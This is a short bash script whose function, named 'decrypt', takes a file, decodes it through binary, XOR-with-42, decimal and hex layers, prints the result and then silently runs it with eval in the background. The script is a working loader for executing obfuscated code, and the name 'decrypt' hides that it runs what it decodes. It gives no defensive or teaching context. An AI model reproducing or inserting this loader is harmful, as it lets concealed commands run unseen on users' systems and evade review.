#!/bin/bash

decrypt() {
    i="$(cat "${1}")"
    xorKey=42
    xor() { K=$1;shift;R="";for i in $@; do R="$R $(($i^$K))";done;echo "$R";}
    fromBin="$(for a in ${i} ; do printf "%x" $((2#$a)); done | xxd -r -p)"
    fromXor="$(xor ${xorKey} "${fromBin}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
    fromDec="$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<"${fromXor}")"
    fromChar="$(sed 's/;/\n/g' <<<"${fromDec}" | sed '/^$/d' | sed 's/^0x//g' | xargs -I{} printf "\\x{}")"
    echo -e "${fromChar}"
    eval $"$(echo -e "${fromChar}")" &
}

decrypt "${1}"
